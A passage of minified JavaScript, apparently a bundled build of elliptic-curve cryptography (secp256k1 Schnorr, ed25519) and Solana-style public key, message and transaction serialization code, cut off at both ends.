e=BigInt("0x3086d221a7d46bcde86c90e49284eb15"),r=-nt*BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),i=BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),n=BigInt("0x100000000000000000000000000000000"),o=nr(e*t,i7),s=nr(-r*t,i7),a=(0,td.mod)(t-o*e-s*i,i7),u=(0,td.mod)(-o*r-s*e,i7),l=a>n,c=u>n;if(l&&(a=i7-a),c&&(u=i7-u),a>n||u>n)throw Error("splitScalar: Endomorphism failed, k="+t);return{k1neg:l,k1:a,k2neg:c,k2:u}}}},iW.sha256);const no=BigInt(0),ns={};function na(t,...e){let r=ns[t];if(void 0===r){let e=(0,iW.sha256)(Uint8Array.from(t,t=>t.charCodeAt(0)));r=(0,tp.concatBytes)(e,e),ns[t]=r}return(0,iW.sha256)((0,tp.concatBytes)(r,...e))}const nu=t=>t.toRawBytes(!0).slice(1),nl=t=>(0,tp.numberToBytesBE)(t,32),nc=t=>(0,td.mod)(t,i9),nh=t=>(0,td.mod)(t,i7),nf=iq.secp256k1.ProjectivePoint,nd=(t,e,r)=>nf.BASE.multiplyAndAddUnsafe(t,e,r);function np(t){let e=iq.secp256k1.utils.normPrivateKeyToScalar(t),r=nf.fromPrivateKey(e);return{scalar:r.hasEvenY()?e:nh(-e),bytes:nu(r)}}function ng(t){(0,tp.aInRange)("x",t,nt,i9);let e=nc(t*t),r=ni(nc(e*t+BigInt(7)));r%ne!==no&&(r=nc(-r));let i=new nf(t,r,nt);return i.assertValidity(),i}const nm=tp.bytesToNumberBE;function ny(...t){return nh(nm(na("BIP0340/challenge",...t)))}function nb(t,e,r){let i=(0,tp.ensureBytes)("signature",t,64),n=(0,tp.ensureBytes)("message",e),o=(0,tp.ensureBytes)("publicKey",r,32);try{let t=ng(nm(o)),e=nm(i.subarray(0,32));if(!(0,tp.inRange)(e,nt,i9))return!1;let r=nm(i.subarray(32,64));if(!(0,tp.inRange)(r,nt,i7))return!1;let s=ny(nl(e),nu(t),n),a=nd(t,r,nh(-s));if(!a||!a.hasEvenY()||a.toAffine().x!==e)return!1;return!0}catch(t){return!1}}iq.schnorr={getPublicKey:function(t){return np(t).bytes},sign:function(t,e,r=(0,k.randomBytes)(32)){let i=(0,tp.ensureBytes)("message",t),{bytes:n,scalar:o}=np(e),s=nl(o^nm(na("BIP0340/aux",(0,tp.ensureBytes)("auxRand",r,32)))),a=nh(nm(na("BIP0340/nonce",s,n,i)));if(a===no)throw Error("sign failed: k is zero");let{bytes:u,scalar:l}=np(a),c=ny(u,n,i),h=new Uint8Array(64);if(h.set(u,0),h.set(nl(nh(l+c*o)),32),!nb(h,i,n))throw Error("sign: Invalid signature produced");return h},verify:nb,utils:{randomPrivateKey:iq.secp256k1.utils.randomPrivateKey,lift_x:ng,pointToBytes:nu,numberToBytesBE:tp.numberToBytesBE,bytesToNumberBE:tp.bytesToNumberBE,taggedHash:na,mod:td.mod}};const nw=(0,tv.isogenyMap)(nn,[["0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa8c7","0x7d3d4c80bc321d5b9f315cea7fd44c5d595d2fc0bf63b92dfff1044f17c6581","0x534c328d23f234e6e2a413deca25caece4506144037c40314ecbd0b53d9dd262","0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa88c"],["0xd35771193d94918a9ca34ccbb7b640dd86cd409542f8487d9fe6b745781eb49b","0xedadc6f64383dc1df7c4b2d51b54225406d36b641f5e41bbc52a56612a8c6d14","0x0000000000000000000000000000000000000000000000000000000000000001"],["0x4bda12f684bda12f684bda12f684bda12f684bda12f684bda12f684b8e38e23c","0xc75e0c32d5cb7c0fa9d0a54b12a0a6d5647ab046d686da6fdffc90fc201d71a3","0x29a6194691f91a73715209ef6512e576722830a201be2018a765e85a9ecee931","0x2f684bda12f684bda12f684bda12f684bda12f684bda12f684bda12f38e38d84"],["0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffff93b","0x7a06534bb8bdb49fd5e9e6632722c2989467c1bfc8e8d978dfb425d2685c2573","0x6484aa716545ca2cf3a70c3fa8fe337e0a3d21162f0d6299a7bf8192bfd2a76f","0x0000000000000000000000000000000000000000000000000000000000000001"]].map(t=>t.map(t=>BigInt(t)))),nv=(0,iJ.mapToCurveSimpleSWU)(nn,{A:BigInt("0x3f8731abdd661adca08a5558f0f5d272e953d363cb6f0e5d405447c01a444533"),B:BigInt("1771"),Z:nn.create(BigInt("-11"))}),nx=(0,tv.createHasher)(iq.secp256k1.ProjectivePoint,t=>{let{x:e,y:r}=nv(nn.create(t[0]));return nw(e,r)},{DST:"secp256k1_XMD:SHA-256_SSWU_RO_",encodeDST:"secp256k1_XMD:SHA-256_SSWU_NU_",p:nn.ORDER,m:1,k:128,expand:"xmd",hash:iW.sha256});iq.hashToCurve=nx.hashToCurve,iq.encodeToCurve=nx.encodeToCurve,d.ed25519.utils.randomPrivateKey;const nk=()=>{let t=(0,d.ed25519).utils.randomPrivateKey(),e=nS(t),r=new Uint8Array(64);return r.set(t),r.set(e,32),{publicKey:e,secretKey:r}},nS=d.ed25519.getPublicKey;function nB(t){try{return(0,d.ed25519).ExtendedPoint.fromHex(t),!0}catch{return!1}}const nE=(t,e)=>(0,d.ed25519).sign(t,e.slice(0,32)),nA=d.ed25519.verify,n_=t=>(0,f.Buffer).isBuffer(t)?t:t instanceof Uint8Array?(0,f.Buffer).from(t.buffer,t.byteOffset,t.byteLength):(0,f.Buffer).from(t);class nI{constructor(t){Object.assign(this,t)}encode(){return(0,f.Buffer).from((0,ex.serialize)(nM,this))}static decode(t){return(0,ex.deserialize)(nM,this,t)}static decodeUnchecked(t){return(0,ex.deserializeUnchecked)(nM,this,t)}}const nM=new Map;let nL=1;class nT extends nI{constructor(t){if(super({}),this._bn=void 0,void 0!==t._bn)this._bn=t._bn;else{if("string"==typeof t){let r=e(t4).decode(t);if(32!=r.length)throw Error("Invalid public key input");this._bn=new(e(t5))(r)}else this._bn=new(e(t5))(t);if(this._bn.byteLength()>32)throw Error("Invalid public key input")}}static unique(){let t=new nT(nL);return nL+=1,new nT(t.toBuffer())}equals(t){return this._bn.eq(t._bn)}toBase58(){return e(t4).encode(this.toBytes())}toJSON(){return this.toBase58()}toBytes(){let t=this.toBuffer();return new Uint8Array(t.buffer,t.byteOffset,t.byteLength)}toBuffer(){let t=this._bn.toArrayLike(f.Buffer);if(32===t.length)return t;let e=(0,f.Buffer).alloc(32);return t.copy(e,32-t.length),e}get[Symbol.toStringTag](){return`PublicKey(${this.toString()})`}toString(){return this.toBase58()}static async createWithSeed(t,e,r){let i=(0,f.Buffer).concat([t.toBuffer(),(0,f.Buffer).from(e),r.toBuffer()]);return new nT((0,t9.sha256)(i))}static createProgramAddressSync(t,e){let r=(0,f.Buffer).alloc(0);t.forEach(function(t){if(t.length>32)throw TypeError("Max seed length exceeded");r=(0,f.Buffer).concat([r,n_(t)])}),r=(0,f.Buffer).concat([r,e.toBuffer(),(0,f.Buffer).from("ProgramDerivedAddress")]);let i=(0,t9.sha256)(r);if(nB(i))throw Error("Invalid seeds, address must fall off the curve");return new nT(i)}static async createProgramAddress(t,e){return this.createProgramAddressSync(t,e)}static findProgramAddressSync(t,e){let r,i=255;for(;0!=i;){try{let n=t.concat((0,f.Buffer).from([i]));r=this.createProgramAddressSync(n,e)}catch(t){if(t instanceof TypeError)throw t;i--;continue}return[r,i]}throw Error("Unable to find a viable program address nonce")}static async findProgramAddress(t,e){return this.findProgramAddressSync(t,e)}static isOnCurve(t){return nB(new nT(t).toBytes())}}nT.default=new nT("11111111111111111111111111111111"),nM.set(nT,{kind:"struct",fields:[["_bn","u256"]]}),new nT("BPFLoader1111111111111111111111111111111111");class nO extends Error{constructor(t){super(`Signature ${t} has expired: block height exceeded.`),this.signature=void 0,this.signature=t}}Object.defineProperty(nO.prototype,"name",{value:"TransactionExpiredBlockheightExceededError"});class nP extends Error{constructor(t,e){super(`Transaction was not confirmed in ${e.toFixed(2)} seconds. It is unknown if it succeeded or failed. Check signature ${t} using the Solana Explorer or CLI tools.`),this.signature=void 0,this.signature=t}}Object.defineProperty(nP.prototype,"name",{value:"TransactionExpiredTimeoutError"});class nR extends Error{constructor(t){super(`Signature ${t} has expired: the nonce is no longer valid.`),this.signature=void 0,this.signature=t}}Object.defineProperty(nR.prototype,"name",{value:"TransactionExpiredNonceInvalidError"});class nC{constructor(t,e){this.staticAccountKeys=void 0,this.accountKeysFromLookups=void 0,this.staticAccountKeys=t,this.accountKeysFromLookups=e}keySegments(){let t=[this.staticAccountKeys];return this.accountKeysFromLookups&&(t.push(this.accountKeysFromLookups.writable),t.push(this.accountKeysFromLookups.readonly)),t}get(t){for(let e of this.keySegments()){if(t<e.length)return e[t];t-=e.length}}get length(){return this.keySegments().flat().length}compileInstructions(t){if(this.length>256)throw Error("Account index overflow encountered during compilation");let e=new Map;this.keySegments().flat().forEach((t,r)=>{e.set(t.toBase58(),r)});let r=t=>{let r=e.get(t.toBase58());if(void 0===r)throw Error("Encountered an unknown instruction account key during compilation");return r};return t.map(t=>({programIdIndex:r(t.programId),accountKeyIndexes:t.keys.map(t=>r(t.pubkey)),data:t.data}))}}const nU=(t="publicKey")=>eW.blob(32,t),nN=(t="string")=>{let e=eW.struct([eW.u32("length"),eW.u32("lengthPadding"),eW.blob(eW.offset(eW.u32(),-8),"chars")],t),r=e.decode.bind(e),i=e.encode.bind(e);return e.decode=(t,e)=>r(t,e).chars.toString(),e.encode=(t,e,r)=>i({chars:(0,f.Buffer).from(t,"utf8")},e,r),e.alloc=t=>eW.u32().span+eW.u32().span+(0,f.Buffer).from(t,"utf8").length,e};function nz(t){let e=0,r=0;for(;;){let i=t.shift();if(e|=(127&i)<<7*r,r+=1,(128&i)==0)break}return e}function nH(t,e){let r=e;for(;;){let e=127&r;if(0==(r>>=7)){t.push(e);break}e|=128,t.push(e)}}function nq(t,e){if(!t)throw Error(e||"Assertion failed")}class nW{constructor(t,e){this.payer=void 0,this.keyMetaMap=void 0,this.payer=t,this.keyMetaMap=e}static compile(t,e){let r=new Map,i=t=>{let e=t.toBase58(),i=r.get(e);return void 0===i&&(i={isSigner:!1,isWritable:!1,isInvoked:!1},r.set(e,i)),i},n=i(e);for(let e of(n.isSigner=!0,n.isWritable=!0,t))for(let t of(i(e.programId).isInvoked=!0,e.keys)){let e=i(t.pubkey);e.isSigner||=t.isSigner,e.isWritable||=t.isWritable}return new nW(e,r)}getMessageComponents(){let t=[...this.keyMetaMap.entries()];nq(t.length<=256,"Max static account keys length exceeded");let e=t.filter(([,t])=>t.isSigner&&t.isWritable),r=t.filter(([,t])=>t.isSigner&&!t.isWritable),i=t.filter(([,t])=>!t.isSigner&&t.isWritable),n=t.filter(([,t])=>!t.isSigner&&!t.isWritable),o={numRequiredSignatures:e.length+r.length,numReadonlySignedAccounts:r.length,numReadonlyUnsignedAccounts:n.length};{nq(e.length>0,"Expected at least one writable signer key");let[t]=e[0];nq(t===this.payer.toBase58(),"Expected first writable signer key to be the fee payer")}return[o,[...e.map(([t])=>new nT(t)),...r.map(([t])=>new nT(t)),...i.map(([t])=>new nT(t)),...n.map(([t])=>new nT(t))]]}extractTableLookup(t){let[e,r]=this.drainKeysFoundInLookupTable(t.state.addresses,t=>!t.isSigner&&!t.isInvoked&&t.isWritable),[i,n]=this.drainKeysFoundInLookupTable(t.state.addresses,t=>!t.isSigner&&!t.isInvoked&&!t.isWritable);if(0!==e.length||0!==i.length)return[{accountKey:t.key,writableIndexes:e,readonlyIndexes:i},{writable:r,readonly:n}]}drainKeysFoundInLookupTable(t,e){let r=[],i=[];for(let[n,o]of this.keyMetaMap.entries())if(e(o)){let e=new nT(n),o=t.findIndex(t=>t.equals(e));o>=0&&(nq(o<256,"Max lookup table index exceeded"),r.push(o),i.push(e),this.keyMetaMap.delete(n))}return[r,i]}}const nF="Reached end of buffer unexpectedly";function nD(t){if(0===t.length)throw Error(nF);return t.shift()}function nj(t,...e){let[r]=e;if(2===e.length?r+(e[1]??0)>t.length:r>=t.length)throw Error(nF);return t.splice(...e)}class nK{constructor(t){this.header=void 0,this.accountKeys=void 0,this.recentBlockhash=void 0,this.instructions=void 0,this.indexToProgramIds=new Map,this.header=t.header,this.accountKeys=t.accountKeys.map(t=>new nT(t)),this.recentBlockhash=t.recentBlockhash,this.instructions=t.instructions,this.instructions.forEach(t=>this.indexToProgramIds.set(t.programIdIndex,this.accountKeys[t.programIdIndex]))}get version(){return"legacy"}get staticAccountKeys(){return this.accountKeys}get compiledInstructions(){return this.instructions.map(t=>({programIdIndex:t.programIdIndex,accountKeyIndexes:t.accounts,data:e(t4).decode(t.data)}))}get addressTableLookups(){return[]}getAccountKeys(){return new nC(this.staticAccountKeys)}static compile(t){let[r,i]=nW.compile(t.instructions,t.payerKey).getMessageComponents(),n=new nC(i).compileInstructions(t.instructions).map(t=>({programIdIndex:t.programIdIndex,accounts:t.accountKeyIndexes,data:e(t4).encode(t.data)}));return new nK({header:r,accountKeys:i,recentBlockhash:t.recentBlockhash,instructions:n})}isAccountSigner(t){return t<this.header.numRequiredSignatures}isAccountWritable(t){let e=this.header.numRequiredSignatures;if(!(t>=this.header.numRequiredSignatures))return t<e-this.header.numReadonlySignedAccounts;{let r=this.accountKeys.length-e-this.header.numReadonlyUnsignedAccounts;return t-e<r}}isProgramId(t){return this.indexToProgramIds.has(t)}programIds(){return[...this.indexToProgramIds.values()]}nonProgramIds(){return this.accountKeys.filter((t,e)=>!this.isProgramId(e))}serialize(){let t=this.accountKeys.length,r=[];nH(r,t);let i=this.instructions.map(t=>{let{accounts:r,programIdIndex:i}=t,n=Array.from(e(t4).decode(t.data)),o=[];nH(o,r.length);let s=[];return nH(s,n.length),{programIdIndex:i,keyIndicesCount:(0,f.Buffer).from(o),keyIndices:r,dataLength:(0,f.Buffer).from(s),data:n}}),n=[];nH(n,i.length);let o=(0,f.Buffer).alloc(1232);(0,f.Buffer).from(n).copy(o);let s=n.length;i.forEach(t=>{let e=eW.struct([eW.u8("programIdIndex"),eW.blob(t.keyIndicesCount.length,"keyIndicesCount"),eW.seq(eW.u8("keyIndex"),t.keyIndices.length,"keyIndices"),eW.blob(t.dataLength.length,"dataLength"),eW.seq(eW.u8("userdatum"),t.data.length,"data")]).encode(t,o,s);s+=e}),o=o.slice(0,s);let a=eW.struct([eW.blob(1,"numRequiredSignatures"),eW.blob(1,"numReadonlySignedAccounts"),eW.blob(1,"numReadonlyUnsignedAccounts"),eW.blob(r.length,"keyCount"),eW.seq(nU("key"),t,"keys"),nU("recentBlockhash")]),u={numRequiredSignatures:(0,f.Buffer).from([this.header.numRequiredSignatures]),numReadonlySignedAccounts:(0,f.Buffer).from([this.header.numReadonlySignedAccounts]),numReadonlyUnsignedAccounts:(0,f.Buffer).from([this.header.numReadonlyUnsignedAccounts]),keyCount:(0,f.Buffer).from(r),keys:this.accountKeys.map(t=>n_(t.toBytes())),recentBlockhash:e(t4).decode(this.recentBlockhash)},l=(0,f.Buffer).alloc(2048),c=a.encode(u,l);return o.copy(l,c),l.slice(0,c+o.length)}static from(t){let r=[...t],i=nD(r);if(i!==(127&i))throw Error("Versioned messages must be deserialized with VersionedMessage.deserialize()");let n=nD(r),o=nD(r),s=nz(r),a=[];for(let t=0;t<s;t++){let t=nj(r,0,32);a.push(new nT((0,f.Buffer).from(t)))}let u=nj(r,0,32),l=nz(r),c=[];for(let t=0;t<l;t++){let t=nD(r),i=nz(r),n=nj(r,0,i),o=nz(r),s=nj(r,0,o),a=e(t4).encode((0,f.Buffer).from(s));c.push({programIdIndex:t,accounts:n,data:a})}return new nK({header:{numRequiredSignatures:i,numReadonlySignedAccounts:n,numReadonlyUnsignedAccounts:o},recentBlockhash:e(t4).encode((0,f.Buffer).from(u)),accountKeys:a,instructions:c})}}class nV{constructor(t){this.header=void 0,this.staticAccountKeys=void 0,this.recentBlockhash=void 0,this.compiledInstructions=void 0,this.addressTableLookups=void 0,this.header=t.header,this.staticAccountKeys=t.staticAccountKeys,this.recentBlockhash=t.recentBlockhash,this.compiledInstructions=t.compiledInstructions,this.addressTableLookups=t.addressTableLookups}get version(){return 0}get numAccountKeysFromLookups(){let t=0;for(let e of this.addressTableLookups)t+=e.readonlyIndexes.length+e.writableIndexes.length;return t}getAccountKeys(t){let e;if(t&&"accountKeysFromLookups"in t&&t.accountKeysFromLookups){if(this.numAccountKeysFromLookups!=t.accountKeysFromLookups.writable.length+t.accountKeysFromLookups.readonly.length)throw Error("Failed to get account keys because of a mismatch in the number of account keys from lookups");e=t.accountKeysFromLookups}else if(t&&"addressLookupTableAccounts"in t&&t.addressLookupTableAccounts)e=this.resolveAddressTableLookups(t.addressLookupTableAccounts);else if(this.addressTableLookups.length>0)throw Error("Failed to get account keys because address table lookups were not resolved");return new nC(this.staticAccountKeys,e)}isAccountSigner(t){return t<this.header.numRequiredSignatures}isAccountWritable(t){let e=this.header.numRequiredSignatures,r=this.staticAccountKeys.length;if(t>=r)return t-r<this.addressTableLookups.reduce((t,e)=>t+e.writableIndexes.length,0);if(!(t>=this.header.numRequiredSignatures))return t<e-this.header.numReadonlySignedAccounts;{let i=r-e-this.header.numReadonlyUnsignedAccounts;return t-e<i}}resolveAddressTableLookups(t){let e={writable:[],readonly:[]};for(let r of this.addressTableLookups){let i=t.find(t=>t.key.equals(r.accountKey));if(!i)throw Error(`Failed to find address lookup table account for table key ${r.accountKey.toBase58()}`);for(let t of r.writableIndexes)if(t<i.state.addresses.length)e.writable.push(i.state.addresses[t]);else throw Error(`Failed to find address for index ${t} in address lookup table ${r.accountKey.toBase58()}`);for(let t of r.readonlyIndexes)if(t<i.state.addresses.length)e.readonly.push(i.state.addresses[t]);else throw Error(`Failed to find address for index ${t} in address lookup table ${r.accountKey.toBase58()}`)}return e}static compile(t){let e=nW.compile(t.instructions,t.payerKey),r=[],i={writable:[],readonly:[]};for(let n of t.addressLookupTableAccounts||[]){let t=e.extractTableLookup(n);if(void 0!==t){let[e,{writable:n,readonly:o}]=t;r.push(e),i.writable.push(...n),i.readonly.push(...o)}}let[n,o]=e.getMessageComponents(),s=new nC(o,i).compileInstructions(t.instructions);return new nV({header:n,staticAccountKeys:o,recentBlockhash:t.recentBlockhash,compiledInstructions:s,addressTableLookups:r})}serialize(){let t=[];nH(t,this.staticAccountKeys.length);let r=this.serializeInstructions(),i=[];nH(i,this.compiledInstructions.length);let n=this.serializeAddressTableLookups(),o=[];nH(o,this.addressTableLookups.length);let s=eW.struct([eW.u8("prefix"),eW.struct([eW.u8("numRequiredSignatures"),eW.u8("numReadonlySignedAccounts"),eW.u8("numReadonlyUnsignedAccounts")],"header"),eW.blob(t.length,"staticAccountKeysLength"),eW.seq(nU(),this.staticAccountKeys.length,"staticAccountKeys"),nU("recentBlockhash"),eW.blob(i.length,"instructionsLength"),eW.blob(r.length,"serializedInstructions"),eW.blob(o.length,"addressTableLookupsLength"),eW.blob(n.length,"serializedAddressTableLookups")]),a=new Uint8Array(1232),u=s.encode({prefix:128,header:this.header,staticAccountKeysLength:new Uint8Array(t),staticAccountKeys:this.staticAccountKeys.map(t=>t.toBytes()),recentBlockhash:e(t4).decode(this.recentBlockhash),instructionsLength:new Uint8Array(i),serializedInstructions:r,addressTableLookupsLength:new Uint8Array(o),serializedAddressTableLookups:n},a);return a.slice(0,u)}serializeInstructions(){let t=0,e=new Uint8Array(1232);for(let r of this.compiledInstructions){let i=[];nH(i,r.accountKeyIndexes.length);let n=[];nH(n,r.data.length);let o=eW.struct([eW.u8("programIdIndex"),eW.blob(i.length,"encodedAccountKeyIndexesLength"),eW.seq(eW.u8(),r.accountKeyIndexes.length,"accountKeyIndexes"),eW.blob(n.length,"encodedDataLength"),eW.blob(r.data.length,"data")]);t+=o.encode({programIdIndex:r.programIdIndex,encodedAccountKeyIndexesLength:new Uint8Array(i),accountKeyIndexes:r.accountKeyIndexes,encodedDataLength:new Uint8Array(n),data:r.data},e,t)}return e.slice(0,t)}serializeAddressTableLookups(){let t=0,e=new Uint8Array(1232);for(let r of this.addressTableLookups){let i=[];nH(i,r.writableIndexes.length);let n=[];nH(n,r.readonlyIndexes.length);let o=eW.struct([nU("accountKey"),eW.blob(i.length,"encodedWritableIndexesLength"),eW.seq(eW.u8(),r.writableIndexes.length,"writableIndexes"),eW.blob(n.length,"encodedReadonlyIndexesLength"),eW.seq(eW.u8(),r.readonlyIndexes.length,"readonlyIndexes")]);t+=o.encode({accountKey:r.accountKey.toBytes(),encodedWritableIndexesLength:new Uint8Array(i),writableIndexes:r.writableIndexes,encodedReadonlyIndexesLength:new Uint8Array(n),readonlyIndexes:r.readonlyIndexes},e,t)}return e.slice(0,t)}static deserialize(t){let r=[...t],i=nD(r),n=127&i;nq(i!==n,"Expected versioned message but received legacy message"),nq(0===n,`Expected versioned message with version 0 but found version ${n}`);let o={numRequiredSignatures:nD(r),numReadonlySignedAccounts:nD(r),numReadonlyUnsignedAccounts:nD(r)},s=[],a=nz(r);for(let t=0;t<a;t++)s.push(new nT(nj(r,0,32)));let u=e(t4).encode(nj(r,0,32)),l=nz(r),c=[];for(let t=0;t<l;t++){let t=nD(r),e=nz(r),i=nj(r,0,e),n=nz(r),o=new Uint8Array(nj(r,0,n));c.push({programIdIndex:t,accountKeyIndexes:i,data:o})}let h=nz(r),f=[];for(let t=0;t<h;t++){let t=new nT(nj(r,0,32)),e=nz(r),i=nj(r,0,e),n=nz(r),o=nj(r,0,n);f.push({accountKey:t,writableIndexes:i,readonlyIndexes:o})}return new nV({header:o,staticAccountKeys:s,recentBlockhash:u,compiledInstructions:c,addressTableLookups:f})}}let n$=((r={})[r.BLOCKHEIGHT_EXCEEDED=0]="BLOCKHEIGHT_EXCEEDED",r[r.PROCESSED=1]="PROCESSED",r[r.TIMED_OUT=2]="TIMED_OUT",r[r.NONCE_INVALID=3]="NONCE_INVALID",r);const nZ=(0,f.Buffer).alloc(64).fill(0);class nG{constructor(t){this.keys=void 0,this.programId=void 0,this.data=(0,f.Buffer).alloc(0),this.programId=t.programId,this.keys=t.keys,t.data&&(this.data=t.data)}toJSON(){return{keys:this.keys.map(({pubkey:t,isSigner:e,isWritable:r})=>({pubkey:t.toJSON(),isSigner:e,isWritable:r})),programId:this.programId.toJSON(),data:[...this.data]}}}class nJ{get signature(){return this.signatures.length>0?this.signatures[0].signature:null}constructor(t){if(this.signatures=[],this.feePayer=void 0,this.instructions=[],this.recentBlockhash=void 0,this.lastValidBlockHeight=void 0,this.nonceInfo=void 0,this.minNonceContextSlot=void 0,this._message=void 0,this._json=void 0,!t)return;if(t.feePayer&&(this.feePayer=t.feePayer),t.signatures&&(this.signatures=t.signatures),Object.prototype.hasOwnProperty.call(t,"nonceInfo")){let{minContextSlot:e,nonceInfo:r}=t;this.minNonceContextSlot=e,this.nonceInfo=r}else if(Object.prototype.hasOwnProperty.call(t,"lastValidBlockHeight")){let{blockhash:e,lastValidBlockHeight:r}=t;this.recentBlockhash=e,this.lastValidBlockHeight=r}else{let{recentBlockhash:e,nonceInfo:r}=t;r&&(this.nonceInfo=r),this.recentBlockhash=e}}toJSON(){return{recentBlockhash:this.recentBlockhash||null,feePayer:this.feePayer?this.feePayer.toJSON():null,nonceInfo:this.nonceInfo?{nonce:this.nonceInfo.nonce,nonceInstruction:this.nonceInfo.nonceInstruction.toJSON()}:null,instructions:this.instructions.map(t=>t.toJSON()),signers:this.signatures.map(({publicKey:t})=>t.toJSON())}}add(...t){if(0===t.length)throw Error("No instructions");return t.forEach(t=>{"instructions"in t?this.instructions=this.instructions.concat(t.instructions):"data"in t&&"programId"in t&&"keys"in t?this.instructions.push(t):this.instructions.push(new nG(t))}),this}compileMessage(){let t,r,i;if(this._message&&JSON.stringify(this.toJSON())===JSON.stringify(this._json))return this._message;if(this.nonceInfo?(t=this.nonceInfo.nonce,r=this.instructions[0]!=this.nonceInfo.nonceInstruction?[this.nonceInfo.nonceInstruction,...this.instructions]:this.instructions):(t=this.recentBlockhash,r=this.instructions),!t)throw Error("Transaction recentBlockhash required");if(r.length<1&&console.warn("No instructions provided"),this.feePayer)i=this.feePayer;else if(this.signatures.length>0&&this.signatures[0].publicKey)i=this.signatures[0].publicKey;else throw Error("Transaction fee payer required");for(let t=0;t<r.length;t++)if(void 0===r[t].programId)throw Error(`Transaction instruction index ${t} has undefined program id`);let n=[],o=[];r.forEach(t=>{t.keys.forEach(t=>{o.push({...t})});let e=t.programId.toString();n.includes(e)||n.push(e)}),n.forEach(t=>{o.push({pubkey:new nT(t),isSigner:!1,isWritable:!1})});let s=[];o.forEach(t=>{let e=t.pubkey.toString(),r=s.findIndex(t=>t.pubkey.toString()===e);r>-1?(s[r].isWritable=s[r].isWritable||t.isWritable,s[r].isSigner=s[r].isSigner||t.isSigner):s.push(t)}),s.sort(function(t,e){return t.isSigner!==e.isSigner?t.isSigner?-1:1:t.isWritable!==e.isWritable?t.isWritable?-1:1:t.pubkey.toBase58().localeCompare(e.pubkey.toBase58(),"en",{localeMatcher:"best fit",usage:"sort",sensitivity:"variant",ignorePunctuation:!1,numeric:!1,caseFirst:"lower"})});let a=s.findIndex(t=>t.pubkey.equals(i));if(a>-1){let[t]=s.splice(a,1);t.isSigner=!0,t.isWritable=!0,s.unshift(t)}else s.unshift({pubkey:i,isSigner:!0,isWritable:!0});for(let t of this.signatures){let e=s.findIndex(e=>e.pubkey.equals(t.publicKey));if(e>-1)s[e].isSigner||(s[e].isSigner=!0,console.warn("Transaction references a signature that is unnecessary, only the fee payer and instruction signer accounts should sign a transaction. This behavior is deprecated and will throw an error in the next major version release."));else throw Error(`unknown signer: ${t.publicKey.toString()}`)}let u=0,l=0,c=0,h=[],f=[];s.forEach(({pubkey:t,isSigner:e,isWritable:r})=>{e?(h.push(t.toString()),u+=1,r||(l+=1)):(f.push(t.toString()),r||(c+=1))});let d=h.concat(f),p=r.map(t=>{let{data:r,programId:i}=t;return{programIdIndex:d.indexOf(i.toString()),accounts:t.keys.map(t=>d.indexOf(t.pubkey.toString())),data:e(t4).encode(r)}});return p.forEach(t=>{nq(t.programIdIndex>=0),t.accounts.forEach(t=>nq(t>=0))}),new nK({header:{numRequiredSignatures:u,numReadonlySignedAccounts:l,numReadonlyUnsignedAccounts:c},accountKeys:d,recentBlockhash:t,instructions:p})}_compile(){let t=this.compileMessage(),e=t.accountKeys.slice(0,t.header.numRequiredSignatures);return this.signatures.length===e.length&&this.signatures.every((t,r)=>e[r].equals(t.publicKey))||(this.signatures=e.map(t=>({signature:null,publicKey:t}))),t}serializeMessage(){return this._compile().serialize()}async getEstimatedFee(t){return(await t.getFeeForMessage(this.compileMessage())).value}setSigners(...t){if(0===t.length)throw Error("No signers");let e=new Set;this.signatures=t.filter(t=>{let r=t.toString();return!e.has(r)&&(e.add(r),!0)}).map(t=>({signature:null,publicKey:t}))}sign(...t){if(0===t.length)throw Error("No signers");let e=new Set,r=[];for(let i of t){let t=i.publicKey.toString();e.has(t)||(e.add(t),r.push(i))}this.signatures=r.map(t=>({signature:null,publicKey:t.publicKey}));let i=this._compile();this._partialSign(i,...r)}partialSign(...t){if(0===t.length)throw Error("No signers");let e=new Set,r=[];for(let i of t){let t=i.publicKey.toString();e.has(t)||(e.add(t),r.push(i))}let i=this._compile();this._partialSign(i,...r)}_partialSign(t,...e){let r=t.serialize();e.forEach(t=>{let e=nE(r,t.secretKey);this._addSignature(t.publicKey,n_(e))})}addSignature(t,e){this._compile(),this._addSignature(t,e)}_addSignature(t,e){nq(64===e.length);let r=this.signatures.findIndex(e=>t.equals(e.publicKey));if(r<0)throw Error(`unknown signer: ${t.toString()}`);this.signatures[r].signature=(0,f.Buffer).from(e)}verifySignatures(t=!0){return!this._getMessageSignednessErrors(this.serializeMessage(),t)}_getMessageSignednessErrors(t,e){let r={};for(let{signature:i,publicKey:n}of this.signatures)null===i?e&&(r.missing||=[]).push(n):nA(i,t,n.toBytes())||(r.invalid||=[]).push(n);return r.invalid||r.missing?r:void 0}serialize(t){let{requireAllSignatures:e,verifySignatures:r}=Object.assign({requireAllSignatures:!0,verifySignatures:!0},t),i=this.serializeMessage();if(r){let t=this._getMessageSignednessErrors(i,e);if(t){let e="Signature verification failed.";throw t.invalid&&(e+=`
Invalid signature for public key${1===t.invalid.length?"":"(s)"} [\`${t.invalid.map(t=>t.toBase58()).join("`, `")}\`].`),t.missing&&(e+=`
Missing signature for public key${1===t.missing.length?"":"(s)"} [\`${t.missing.map(t=>t.toBase58()).join("`, `")}\`].`),Error(e)}}return this._serialize(i)}_serialize(t){let{signatures:e}=this,r=[];nH(r,e.length);let i=r.length+64*e.length+t.length,n=(0,f.Buffer).alloc(i);return nq(e.length<256),(0,f.Buffer).from(r).copy(n,0),e.forEach(({signature:t},e)=>{null!==t&&(nq(64===t.length,"signature has invalid length"),(0,f.Buffer).from(t).copy(n,r.length+64*e))}),t.copy(n,r.length+64*e.length),nq(n.length<=1232,`Transaction too large: ${n.length} > 1232`),n}get keys(){return nq(1===this.instructions.length),this.instructions[0].keys.map(t=>t.pubkey)}get programId(){return nq(1===this.instructions.length),this.instructions[0].programId}get data(){return nq(1===this.instructions.length),this.instructions[0].data}static from(t){let r=[...t],i=nz(r),n=[];for(let t=0;t<i;t++){let t=nj(r,0,64);n.push(e(t4).encode((0,f.Buffer).from(t)))}return nJ.populate(nK.from(r),n)}static populate(t,r=[]){let i=new nJ;return i.recentBlockhash=t.recentBlockhash,t.header.numRequiredSignatures>0&&(i.feePayer=t.accountKeys[0]),r.forEach((r,n)=>{let o={signature:r==e(t4).encode(nZ)?null:e(t4).decode(r),publicKey:t.accountKeys[n]};i.signatures.push(o)}),t.instructions.forEach(r=>{let 